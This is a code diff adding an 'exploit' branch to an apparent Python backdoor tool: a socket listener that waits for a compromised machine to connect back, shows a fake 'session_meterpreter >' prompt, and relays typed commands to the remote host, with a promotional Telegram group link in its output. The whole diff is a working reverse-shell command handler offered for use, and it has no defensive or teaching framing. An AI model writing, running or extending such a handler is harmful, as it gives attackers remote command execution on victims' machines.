@@ -207,3 +207,54 @@ while True:
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
 		          print("\n", output, "\n")
+
+
+	elif text_main == "exploit":
+
+		import socket
+		import sys
+
+		IP = f'{lhost}'
+		PORT = {lport}
+
+		s = socket.socket(socket.AF_INET,
+			socket.SOCK_STREAM)
+
+		s.setsockopt(socket.SOL_SOCKET, 
+			socket.SO_REUSEADDR, 
+			1)
+
+		s.bind((IP, PORT))
+		s.listen(1)
+
+
+		print("")
+		print(f'[+] Starting Reverse Handler On {rhost}:{rport}')
+		time.sleep(2)
+		print('[*] Startingthe payload backdoor...')
+		time.sleep(1)
+		print('[*] Server is listening on '+ str(rhost) + ":" + str(rport) + '...')
+		conn, addr = s.accept()
+		print('[+] Connected Done From ', addr)
+		time.sleep(2)
+		print("[+] Join Us : https://t.me/Anon0psNews/")
+		time.sleep(1)
+		print("[+] session started...")
+
+		session_door = True
+
+		while session_door:
+
+		      sys.stdout.write("session_meterpreter > ")
+		      command = sys.stdin.readline()
+
+		      if command == 'exit\n':
+		          print('[+] Close')
+		          conn.send(b"exit")
+		          conn.close()
+		          break  
+
+		      elif command != '\n':
+		          conn.send(command.encode())
+		          output = conn.recv(1024)
+		          print("\n", output, "\n")
